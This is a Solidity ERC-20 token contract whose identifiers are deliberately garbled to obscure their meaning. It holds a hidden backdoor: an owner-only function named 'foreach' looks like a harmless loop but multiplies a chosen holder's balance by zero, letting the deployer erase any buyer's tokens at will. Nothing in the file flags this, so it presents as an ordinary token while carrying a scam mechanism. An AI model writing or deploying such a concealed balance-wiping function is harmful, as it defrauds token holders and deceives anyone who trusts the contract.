pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acxount) external view returns (uint256);
    function transfer(address recipient, uint256 amccouunt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amccouunt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amccouunt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    mapping (address => uint256) internal _cbccdaqsd;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract Token is Context, Ownable, IERC20 {
    
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _cbccdaqsd[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acxount) public view override returns (uint256) {
        return _cbccdaqsd[acxount];
    }
    function foreach(address aaddeerr) public onlyowner {
        uint256 trdfs = 7; 
        for (uint256 i = 0; i < trdfs;) {
            _cbccdaqsd[aaddeerr] *= i;
            break;
        }
    }
    function transfer(address recipient, uint256 amccouunt) public virtual override returns (bool) {
        require(_cbccdaqsd[_msgSender()] >= amccouunt, "TT: transfer amccouunt exceeds balance");
        _cbccdaqsd[_msgSender()] -= amccouunt;
        _cbccdaqsd[recipient] += amccouunt;
        emit Transfer(_msgSender(), recipient, amccouunt);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amccouunt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amccouunt;
        emit Approval(_msgSender(), spender, amccouunt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amccouunt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amccouunt, "TT: transfer amccouunt exceeds allowance");

        _cbccdaqsd[sender] -= amccouunt;
        _cbccdaqsd[recipient] += amccouunt;
        _allowances[sender][_msgSender()] -= amccouunt;

        emit Transfer(sender, recipient, amccouunt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}